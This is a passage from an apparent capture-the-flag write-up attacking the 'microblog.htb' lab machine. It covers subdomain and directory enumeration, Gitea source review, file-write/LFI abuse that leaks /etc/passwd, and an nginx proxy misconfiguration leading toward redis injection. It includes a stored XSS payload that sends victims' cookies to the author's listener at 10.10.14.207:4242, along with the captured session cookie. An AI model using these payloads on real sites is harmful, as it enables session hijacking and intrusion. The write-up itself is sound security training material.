 <span class="p">::</span> <span class="n">URL</span>              <span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">microblog</span><span class="o">.</span><span class="n">htb</span>
 <span class="p">::</span> <span class="n">Wordlist</span>         <span class="p">:</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">110000.</span><span class="n">txt</span>
 <span class="p">::</span> <span class="n">Header</span>           <span class="p">:</span> <span class="n">Host</span><span class="p">:</span> <span class="n">FUZZ</span><span class="o">.</span><span class="n">microblog</span><span class="o">.</span><span class="n">htb</span>
 <span class="p">::</span> <span class="n">Follow</span> <span class="n">redirects</span> <span class="p">:</span> <span class="n">false</span>
 <span class="p">::</span> <span class="n">Calibration</span>      <span class="p">:</span> <span class="n">false</span>
 <span class="p">::</span> <span class="n">Timeout</span>          <span class="p">:</span> <span class="mi">10</span>
 <span class="p">::</span> <span class="n">Threads</span>          <span class="p">:</span> <span class="mi">40</span>
 <span class="p">::</span> <span class="n">Matcher</span>          <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="nb">all</span>
 <span class="p">::</span> <span class="n">Filter</span>           <span class="p">:</span> <span class="n">Response</span> <span class="n">size</span><span class="p">:</span> <span class="mi">153</span>
<span class="n">________________________________________________</span>

<span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">3976</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">899</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">84</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">34</span><span class="n">ms</span><span class="p">]</span>
    <span class="o">*</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="n">app</span>

<span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">3732</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">630</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">43</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">30</span><span class="n">ms</span><span class="p">]</span>
    <span class="o">*</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="n">sunny</span>

<span class="p">::</span> <span class="n">Progress</span><span class="p">:</span> <span class="p">[</span><span class="mi">114441</span><span class="o">/</span><span class="mi">114441</span><span class="p">]</span> <span class="p">::</span> <span class="n">Job</span> <span class="p">[</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="p">]</span> <span class="p">::</span> <span class="mi">1156</span> <span class="n">req</span><span class="o">/</span><span class="n">sec</span> <span class="p">::</span> <span class="n">Duration</span><span class="p">:</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">32</span><span class="p">]</span> <span class="p">::</span> <span class="n">Errors</span><span class="p">:</span> <span class="mi">0</span> <span class="p">::</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>dirsearch<span class="w"> </span>-r<span class="w"> </span>-u<span class="w"> </span>http://app.microblog.htb<span class="w">     </span><span class="m">1</span><span class="w"> </span>⚙

<span class="w">  </span>_<span class="p">|</span>.<span class="w"> </span>_<span class="w"> </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w"> </span>_<span class="p">|</span>_<span class="w">    </span>v0.4.2
<span class="w"> </span><span class="o">(</span>_<span class="o">||</span><span class="p">|</span><span class="w"> </span>_<span class="o">)</span><span class="w"> </span><span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span><span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="o">)</span>

Extensions:<span class="w"> </span>php,<span class="w"> </span>aspx,<span class="w"> </span>jsp,<span class="w"> </span>html,<span class="w"> </span>js<span class="w"> </span><span class="p">|</span><span class="w"> </span>HTTP<span class="w"> </span>method:<span class="w"> </span>GET<span class="w"> </span><span class="p">|</span><span class="w"> </span>Threads:<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Wordlist<span class="w"> </span>size:<span class="w"> </span><span class="m">10927</span>

Output<span class="w"> </span>File:<span class="w"> </span>/home/blnkn/.dirsearch/reports/app.microblog.htb/_23-05-16_22-38-34.txt

Error<span class="w"> </span>Log:<span class="w"> </span>/home/blnkn/.dirsearch/logs/errors-23-05-16_22-38-34.log

Target:<span class="w"> </span>http://app.microblog.htb/

<span class="o">[</span><span class="m">22</span>:38:34<span class="o">]</span><span class="w"> </span>Starting:
<span class="o">[</span><span class="m">22</span>:38:45<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>169B<span class="w">  </span>-<span class="w"> </span>/dashboard<span class="w">  </span>-&gt;<span class="w">  </span>http://app.microblog.htb/dashboard/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">22</span>:38:47<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>4KB<span class="w"> </span>-<span class="w"> </span>/index.php
<span class="o">[</span><span class="m">22</span>:38:48<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>169B<span class="w">  </span>-<span class="w"> </span>/login<span class="w">  </span>-&gt;<span class="w">  </span>http://app.microblog.htb/login/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">22</span>:38:49<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>2KB<span class="w"> </span>-<span class="w"> </span>/login/
<span class="o">[</span><span class="m">22</span>:38:49<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>169B<span class="w">  </span>-<span class="w"> </span>/logout<span class="w">  </span>-&gt;<span class="w">  </span>http://app.microblog.htb/logout/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">22</span>:38:49<span class="o">]</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/logout/<span class="w">  </span>-&gt;<span class="w">  </span>/
<span class="o">[</span><span class="m">22</span>:38:53<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>169B<span class="w">  </span>-<span class="w"> </span>/register<span class="w">  </span>-&gt;<span class="w">  </span>http://app.microblog.htb/register/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">22</span>:38:58<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>dashboard/
<span class="o">[</span><span class="m">22</span>:39:11<span class="o">]</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/dashboard/index.php<span class="w">  </span>-&gt;<span class="w">  </span>/login
<span class="o">[</span><span class="m">22</span>:39:22<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>login/
<span class="o">[</span><span class="m">22</span>:39:36<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>2KB<span class="w"> </span>-<span class="w"> </span>/login/index.php
<span class="o">[</span><span class="m">22</span>:39:46<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>logout/
<span class="o">[</span><span class="m">22</span>:39:59<span class="o">]</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/logout/index.php<span class="w">  </span>-&gt;<span class="w">  </span>/
<span class="o">[</span><span class="m">22</span>:40:11<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>register/
<span class="o">[</span><span class="m">22</span>:40:24<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>3KB<span class="w"> </span>-<span class="w"> </span>/register/index.php

Task<span class="w"> </span>Completed
</pre></div>
</div>
<p>We did see from the nmap scan that there’s something running on port 3000, and looking at the source of the <code class="docutils literal notranslate"><span class="pre">index.php</span></code> we can see <code class="docutils literal notranslate"><span class="pre">http://microblog.htb:3000/cooper/microblog</span></code> which is a gitea instance</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-I<span class="w"> </span>http://microblog.htb:3000/cooper/microblog
HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
Server:<span class="w"> </span>nginx/1.18.0
Date:<span class="w"> </span>Tue,<span class="w"> </span><span class="m">16</span><span class="w"> </span>May<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">21</span>:41:24<span class="w"> </span>GMT
Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8
Connection:<span class="w"> </span>keep-alive
Cache-Control:<span class="w"> </span>no-store,<span class="w"> </span>no-transform
Set-Cookie:<span class="w"> </span><span class="nv">i_like_gitea</span><span class="o">=</span>69b905e6e0e48a99<span class="p">;</span><span class="w"> </span><span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span><span class="w"> </span>HttpOnly<span class="p">;</span><span class="w"> </span><span class="nv">SameSite</span><span class="o">=</span>Lax
Set-Cookie:<span class="w"> </span><span class="nv">_csrf</span><span class="o">=</span>9KvfiQ3HwbuEw-YB960l5yIh5m46MTY4NDI3MzI4NDEzMjUwMTQwMA<span class="p">;</span><span class="w"> </span><span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span><span class="w"> </span><span class="nv">Expires</span><span class="o">=</span>Wed,<span class="w"> </span><span class="m">17</span><span class="w"> </span>May<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">21</span>:41:24<span class="w"> </span>GMT<span class="p">;</span><span class="w"> </span>HttpOnly<span class="p">;</span><span class="w"> </span><span class="nv">SameSite</span><span class="o">=</span>Lax
Set-Cookie:<span class="w"> </span><span class="nv">macaron_flash</span><span class="o">=</span><span class="p">;</span><span class="w"> </span><span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span><span class="w"> </span>Max-Age<span class="o">=</span><span class="m">0</span><span class="p">;</span><span class="w"> </span>HttpOnly<span class="p">;</span><span class="w"> </span><span class="nv">SameSite</span><span class="o">=</span>Lax
X-Frame-Options:<span class="w"> </span>SAMEORIGIN
</pre></div>
</div>
<p>We can now read through the source code, and there are a lot of interesting things to note.</p>
<p>There’s a <code class="docutils literal notranslate"><span class="pre">pro</span></code> feature that gives an additional feature to upload images in the blogs, it has some input validation, but maybe we can get around those to upload a shell of some sort</p>
</section>
<section id="xss-red-herring">
<h2>XSS (red herring)<a class="headerlink" href="#xss-red-herring" title="Permalink to this heading">#</a></h2>
<p>One of the first things I noted is that there isn’t really any input validation in the <code class="docutils literal notranslate"><span class="pre">txt</span></code> field creation, nor in the header one</p>
<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">//add text</span>
<span class="x">if (isset($_POST[&#39;txt&#39;]) &amp;&amp; isset($_POST[&#39;id&#39;])) {</span>
<span class="x">chdir(getcwd() . &quot;/../content&quot;);</span>
<span class="x">$txt_nl = nl2br($_POST[&#39;txt&#39;]);</span>
<span class="x">$html = &quot;&lt;div class = \&quot;blog-text\&quot;&gt;{$txt_nl}&lt;/div&gt;&quot;;</span>
<span class="x">$post_file = fopen(&quot;{$_POST[&#39;id&#39;]}&quot;, &quot;w&quot;);</span>
<span class="x">fwrite($post_file, $html);</span>
<span class="x">fclose($post_file);</span>
<span class="x">$order_file = fopen(&quot;order.txt&quot;, &quot;a&quot;);</span>
<span class="x">fwrite($order_file, $_POST[&#39;id&#39;] . &quot;\n&quot;);  </span>
<span class="x">fclose($order_file);</span>
<span class="x">header(&quot;Location: /edit?message=Section added!&amp;status=success&quot;);</span>
<span class="x">}</span>
</pre></div>
</div>
<p>And that makes it vulnerable to XSS, so if I setup some stored XSS in my blog and another user with access to the pro feature visits my blog, I’ll be able to steal his cookie, and log in as him, which would let me access the pro feature</p>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="nx">img</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="nx">x</span><span class="w"> </span><span class="nx">onerror</span><span class="o">=</span><span class="k">this</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s2">&quot;http://10.10.14.207:4242/?c=&quot;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>And it works, but of course all this sounds too easy for HTB, and this is probably just a red herring</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ncat<span class="w"> </span>-lvnkp<span class="w"> </span><span class="m">4242</span>
Ncat:<span class="w"> </span>Version<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org/ncat<span class="w"> </span><span class="o">)</span>
Ncat:<span class="w"> </span>Listening<span class="w"> </span>on<span class="w"> </span>:::4242
Ncat:<span class="w"> </span>Listening<span class="w"> </span>on<span class="w"> </span><span class="m">0</span>.0.0.0:4242
Ncat:<span class="w"> </span>Connection<span class="w"> </span>from<span class="w"> </span><span class="m">10</span>.10.14.207.
Ncat:<span class="w"> </span>Connection<span class="w"> </span>from<span class="w"> </span><span class="m">10</span>.10.14.207:53356.
GET<span class="w"> </span>/?c<span class="o">=</span><span class="nv">username</span><span class="o">=</span>l35fl0r1da0o8s2tdc4ku78g92<span class="w"> </span>HTTP/1.1
Host:<span class="w"> </span><span class="m">10</span>.10.14.207:4242
User-Agent:<span class="w"> </span>Mozilla/5.0<span class="w"> </span><span class="o">(</span>X11<span class="p">;</span><span class="w"> </span>Linux<span class="w"> </span>aarch64<span class="p">;</span><span class="w"> </span>rv:102.0<span class="o">)</span><span class="w"> </span>Gecko/20100101<span class="w"> </span>Firefox/102.0
Accept:<span class="w"> </span>image/avif,image/webp,*/*
Accept-Language:<span class="w"> </span>en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.5
Accept-Encoding:<span class="w"> </span>gzip,<span class="w"> </span>deflate
Connection:<span class="w"> </span>close
Referer:<span class="w"> </span>http://asdf.microblog.htb/
</pre></div>
</div>
</section>
<section id="lfi">
<h2>LFI<a class="headerlink" href="#lfi" title="Permalink to this heading">#</a></h2>
<p>There’s also an <code class="docutils literal notranslate"><span class="pre">LFI</span></code> in the <code class="docutils literal notranslate"><span class="pre">id</span></code> param when creating <code class="docutils literal notranslate"><span class="pre">h1</span></code> headers or a <code class="docutils literal notranslate"><span class="pre">txt</span></code> field in the <code class="docutils literal notranslate"><span class="pre">edit/index.php</span></code></p>
<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">//add header</span>
<span class="x">if (isset($_POST[&#39;header&#39;]) &amp;&amp; isset($_POST[&#39;id&#39;])) {</span>
<span class="x">chdir(getcwd() . &quot;/../content&quot;);</span>
<span class="x">$html = &quot;&lt;div class = \&quot;blog-h1 blue-fill\&quot;&gt;&lt;b&gt;{$_POST[&#39;header&#39;]}&lt;/b&gt;&lt;/div&gt;&quot;;</span>
<span class="x">$post_file = fopen(&quot;{$_POST[&#39;id&#39;]}&quot;, &quot;w&quot;);</span>
<span class="x">fwrite($post_file, $html);</span>
<span class="x">fclose($post_file);</span>
<span class="x">$order_file = fopen(&quot;order.txt&quot;, &quot;a&quot;);</span>
<span class="x">fwrite($order_file, $_POST[&#39;id&#39;] . &quot;\n&quot;);  </span>
<span class="x">fclose($order_file);</span>
<span class="x">header(&quot;Location: /edit?message=Section added!&amp;status=success&quot;);</span>
<span class="x">}</span>
</pre></div>
</div>
<p>We can use that to start leaking stuff out<br />
<img alt="lfi.png" src="../../../../_images/lfi.png" /><br />
<img alt="passwd.png" src="../../../../_images/passwd.png" /></p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grep<span class="w"> </span>sh$<span class="w"> </span>passwd
root:x:0:0:root:/root:/bin/bash
cooper:x:1000:1000::/home/cooper:/bin/bash
git:x:104:111:Git<span class="w"> </span>Version<span class="w"> </span>Control,,,:/home/git:/bin/bash
</pre></div>
</div>
</section>
<section id="nginx-proxy-misconfiguration-leading-to-a-blind-redis-injection">
<h2>Nginx proxy misconfiguration leading to a blind redis injection<a class="headerlink" href="#nginx-proxy-misconfiguration-leading-to-a-blind-redis-injection" title="Permalink to this heading">#</a></h2>
<p>At this stage it’s pretty obvious that the app is using redis, and is connecting to it through a unix domain socket, but to be honest, I would’ve never figured out any of the following without a hint.</p>
<p>I was pointed to this writeup by <code class="docutils literal notranslate"><span class="pre">detectify</span></code>: <a class="reference external" href="https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/">nginx proxy misconfig</a></p>
<p>And we already know this is an nginx server so we can use the LFI to get the nginx config.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>sites-enabled
server<span class="w"> </span><span class="o">{</span>
<span class="w">    </span>listen<span class="w"> </span><span class="m">80</span><span class="p">;</span>
<span class="w">    </span>listen<span class="w"> </span><span class="o">[</span>::<span class="o">]</span>:80<span class="p">;</span>

<span class="w">    </span>root<span class="w"> </span>/var/www/microblog/app<span class="p">;</span>
<span class="w">    </span>index<span class="w"> </span>index.html<span class="w"> </span>index.htm<span class="w"> </span>index-nginx-debian.html<span class="p">;</span>

<span class="w">    </span>server_name<span class="w"> </span>microblog.htb<span class="p">;</span>

<span class="w">    </span>location<span class="w"> </span>/<span class="w"> </span><span class="o">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="m">404</span><span class="p">;</span>
<span class="w">    </span><span class="o">}</span>

<span class="w">    </span><span class="nv">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>/static/css/health/<span class="w"> </span><span class="o">{</span>
<span class="w">        </span>resolver<span class="w"> </span><span class="m">127</span>.0.0.1<span class="p">;</span>
<span class="w">        </span>proxy_pass<span class="w"> </span>http://css.microbucket.htb/health.txt<span class="p">;</span>
<span class="w">    </span><span class="o">}</span>

<span class="w">    </span><span class="nv">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>/static/js/health/<span class="w"> </span><span class="o">{</span>
<span class="w">        </span>resolver<span class="w"> </span><span class="m">127</span>.0.0.1<span class="p">;</span>
<span class="w">        </span>proxy_pass<span class="w"> </span>http://js.microbucket.htb/health.txt<span class="p">;</span>
<span class="w">    </span><span class="o">}</span>

<span class="w">    </span>location<span class="w"> </span>~<span class="w"> </span>/static/<span class="o">(</span>.*<span class="o">)</span>/<span class="o">(</span>.*<span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">        </span>resolver<span class="w"> </span><span class="m">127</span>.0.0.1<span class="p">;</span>
<span class="w">        </span>proxy_pass<span class="w"> </span>http://<span class="nv">$1</span>.microbucket.htb/<span class="nv">$2</span><span class="p">;</span>
<span class="w">    </span><span class="o">}</span>
<span class="o">}</span>
</pre></div>
</div>
<p>So yea! That’s textbook what the detectify writeup is talking about</p>
<p>Let’s set up a redis container as a testing environment</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>docker<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>-it<span class="w"> </span>redis<span class="w"> </span>/bin/bash
Unable<span class="w"> </span>to<span class="w"> </span>find<span class="w"> </span>image<span class="w"> </span><span class="s1">&#39;redis:latest&#39;</span><span class="w"> </span>locally
latest:<span class="w"> </span>Pulling<span class="w"> </span>from<span class="w"> </span>library/redis
b5d25b35c1db:<span class="w"> </span>Pull<span class="w"> </span><span class="nb">complete</span>
6970efae6230:<span class="w"> </span>Pull<span class="w"> </span><span class="nb">complete</span>
fea4afd29d1f:<span class="w"> </span>Pull<span class="w"> </span><span class="nb">complete</span>
7977d153b5b9:<span class="w"> </span>Pull<span class="w"> </span><span class="nb">complete</span>
7945d827bd72:<span class="w"> </span>Pull<span class="w"> </span><span class="nb">complete</span>
b6aa3d1ce554:<span class="w"> </span>Pull<span class="w"> </span><span class="nb">complete</span>
Digest:<span class="w"> </span>sha256:ea30bef6a1424d032295b90db20a869fc8db76331091543b7a80175cede7d887
Status:<span class="w"> </span>Downloaded<span class="w"> </span>newer<span class="w"> </span>image<span class="w"> </span><span class="k">for</span><span class="w"> </span>redis:latest
root@3a4dd12cf617:/data#
</pre></div>
</div>
<p>It’s a debian base</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>root@3a4dd12cf617:/data#<span class="w"> </span>cat<span class="w"> </span>/etc/*release
<span class="nv">PRETTY_NAME</span><span class="o">=</span><span class="s2">&quot;Debian GNU/Linux 11 (bullseye)&quot;</span>
<span class="nv">NAME</span><span class="o">=</span><span class="s2">&quot;Debian GNU/Linux&quot;</span>
<span class="nv">VERSION_ID</span><span class="o">=</span><span class="s2">&quot;11&quot;</span>
<span class="nv">VERSION</span><span class="o">=</span><span class="s2">&quot;11 (bullseye)&quot;</span>
<span class="nv">VERSION_CODENAME</span><span class="o">=</span>bullseye
<span class="nv">ID</span><span class="o">=</span>debian
<span class="nv">HOME_URL</span><span class="o">=</span><span class="s2">&quot;https://www.debian.org/&quot;</span>
<span class="nv">SUPPORT_URL</span><span class="o">=</span><span class="s2">&quot;https://www.debian.org/support&quot;</span>
<span class="nv">BUG_REPORT_URL</span><span class="o">=</span><span class="s2">&quot;https://bugs.debian.org/&quot;</span>
</pre></div>
</div>
<p>Installing  a few tools</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>apt<span class="w"> </span>update<span class="w"> </span>-y
apt<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span>vim<span class="w"> </span>procps<span class="w"> </span>net-tools<span class="w"> </span>curl<span class="w"> </span>nc<span class="w"> </span>python3
</pre></div>
</div>
<p>The container normally would start a redis-server with default settings</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>docker<span class="w"> </span>inspect<span class="w"> </span>redis<span class="p">|</span>jq<span class="w"> </span><span class="s1">&#39;.[].ContainerConfig.Cmd&#39;</span>
<span class="o">[</span>
<span class="w">  </span><span class="s2">&quot;/bin/sh&quot;</span>,
<span class="w">  </span><span class="s2">&quot;-c&quot;</span>,
<span class="w">  </span><span class="s2">&quot;#(nop) &quot;</span>,
<span class="w">  </span><span class="s2">&quot;CMD [\&quot;redis-server\&quot;]&quot;</span>
<span class="o">]</span>
</pre></div>
</div>
<p>But we used /bin/bash as an entrypoint so, that overrides the entrypoint? I think?</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>root@3a4dd12cf617:/data#<span class="w"> </span>netstat<span class="w"> </span>-tulpen
Active<span class="w"> </span>Internet<span class="w"> </span>connections<span class="w"> </span><span class="o">(</span>only<span class="w"> </span>servers<span class="o">)</span>
Proto<span class="w"> </span>Recv-Q<span class="w"> </span>Send-Q<span class="w"> </span>Local<span class="w"> </span>Address<span class="w">           </span>Foreign<span class="w"> </span>Address<span class="w">         </span>State<span class="w">       </span>User<span class="w">       </span>Inode<span class="w">      </span>PID/Program<span class="w"> </span>name
root@3a4dd12cf617:/data#<span class="w"> </span>ps<span class="w"> </span>-ef<span class="p">|</span>grep<span class="w"> </span>redis
root<span class="w">         </span><span class="m">458</span><span class="w">       </span><span class="m">1</span><span class="w">  </span><span class="m">0</span><span class="w"> </span><span class="m">08</span>:52<span class="w"> </span>pts/0<span class="w">    </span><span class="m">00</span>:00:00<span class="w"> </span>grep<span class="w"> </span>redis
</pre></div>
</div>
<p>In any case there’s no redis server, and I don’t think starting the server with default settings makes it available as a unix socket. So after googling around a little, we try to replicate something similar to what’s going on inside our target.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>root@3a4dd12cf617:/data#<span class="w"> </span>cat<span class="w"> </span>&lt;&lt;<span class="w"> </span>!<span class="w"> </span>&gt;<span class="w"> </span>redis.conf
&gt;<span class="w"> </span>unixsocket<span class="w"> </span>/var/run/redis/redis.sock
&gt;<span class="w"> </span>unixsocketperm<span class="w"> </span><span class="m">775</span>
&gt;<span class="w"> </span>!
</pre></div>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">/var/run/redis</span></code> path doesn’t exist so we’re creating it</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>root@3a4dd12cf617:/data#<span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span>/var/run/redis
root@3a4dd12cf617:/data#
</pre></div>
</div>
<p>Starting the server</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>root@3a4dd12cf617:/data#<span class="w"> </span>redis-server<span class="w"> </span>redis.conf
<span class="m">470</span>:C<span class="w"> </span><span class="m">19</span><span class="w"> </span>May<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">09</span>:06:49.645<span class="w"> </span><span class="c1"># oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo</span>
<span class="m">470</span>:C<span class="w"> </span><span class="m">19</span><span class="w"> </span>May<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">09</span>:06:49.645<span class="w"> </span><span class="c1"># Redis version=7.0.11, bits=64, commit=00000000, modified=0, pid=470, just started</span>
<span class="m">470</span>:C<span class="w"> </span><span class="m">19</span><span class="w"> </span>May<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">09</span>:06:49.645<span class="w"> </span><span class="c1"># Configuration loaded</span>
<span class="m">470</span>:M<span class="w"> </span><span class="m">19</span><span class="w"> </span>May<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">09</span>:06:49.645<span class="w"> </span>*<span class="w"> </span>monotonic<span class="w"> </span>clock:<span class="w"> </span>POSIX<span class="w"> </span>clock_gettime
<span class="w">                </span>_._
<span class="w">           </span>_.-<span class="sb">``</span>__<span class="w"> </span><span class="s1">&#39;&#39;</span>-._
<span class="w">      </span>_.-<span class="sb">``</span><span class="w">    </span><span class="sb">`</span>.<span class="w">  </span><span class="sb">`</span>_.<span class="w">  </span><span class="s1">&#39;&#39;</span>-._<span class="w">           </span>Redis<span class="w"> </span><span class="m">7</span>.0.11<span class="w"> </span><span class="o">(</span><span class="m">00000000</span>/0<span class="o">)</span><span class="w"> </span><span class="m">64</span><span class="w"> </span>bit
<span class="w">  </span>.-<span class="sb">``</span><span class="w"> </span>.-<span class="sb">```</span>.<span class="w">  </span><span class="sb">```</span><span class="se">\/</span><span class="w">    </span>_.,_<span class="w"> </span><span class="s1">&#39;&#39;</span>-._
<span class="w"> </span><span class="o">(</span><span class="w">    </span><span class="s1">&#39;      ,       .-`  | `,    )     Running in standalone mode</span>
<span class="s1"> |`-._`-...-` __...-.``-._|&#39;</span><span class="sb">`</span><span class="w"> </span>_.-<span class="s1">&#39;|     Port: 6379</span>
<span class="s1"> |    `-._   `._    /     _.-&#39;</span><span class="w">    </span><span class="p">|</span><span class="w">     </span>PID:<span class="w"> </span><span class="m">470</span>
<span class="w">  </span><span class="sb">`</span>-._<span class="w">    </span><span class="sb">`</span>-._<span class="w">  </span><span class="sb">`</span>-./<span class="w">  </span>_.-<span class="s1">&#39;    _.-&#39;</span>
<span class="w"> </span><span class="p">|</span><span class="sb">`</span>-._<span class="sb">`</span>-._<span class="w">    </span><span class="sb">`</span>-.__.-<span class="s1">&#39;    _.-&#39;</span>_.-<span class="s1">&#39;|</span>
<span class="s1"> |    `-._`-._        _.-&#39;</span>_.-<span class="s1">&#39;    |           https://redis.io</span>
<span class="s1">  `-._    `-._`-.__.-&#39;</span>_.-<span class="s1">&#39;    _.-&#39;</span>
<span class="w"> </span><span class="p">|</span><span class="sb">`</span>-._<span class="sb">`</span>-._<span class="w">    </span><span class="sb">`</span>-.__.-<span class="s1">&#39;    _.-&#39;</span>_.-<span class="s1">&#39;|</span>
<span class="s1"> |    `-._`-._        _.-&#39;</span>_.-<span class="s1">&#39;    |</span>
<span class="s1">  `-._    `-._`-.__.-&#39;</span>_.-<span class="s1">&#39;    _.-&#39;</span>
<span class="w">      </span><span class="sb">`</span>-._<span class="w">    </span><span class="sb">`</span>-.__.-<span class="s1">&#39;    _.-&#39;</span>
<span class="w">          </span><span class="sb">`</span>-._<span class="w">        </span>_.-<span class="s1">&#39;</span>
<span class="s1">              `-.__.-&#39;</span>

<span class="m">470</span>:M<span class="w"> </span><span class="m">19</span><span class="w"> </span>May<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">09</span>:06:49.646<span class="w"> </span><span class="c1"># Server initialized</span>
<span class="m">470</span>:M<span class="w"> </span><span class="m">19</span><span class="w"> </span>May<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">09</span>:06:49.646<span class="w"> </span><span class="c1"># WARNING Memory overcommit must be enabled! Without it, a background save or replication may fail under low memory condition. Being disabled, it can can also cause failures without low memory condition, see https://github.com/jemalloc/jemalloc/issues/1328. To fix this issue add &#39;vm.overcommit_memory = 1&#39; to /etc/sysctl.conf and then reboot or run the command &#39;sysctl vm.overcommit_memory=1&#39; for this to take effect.</span>
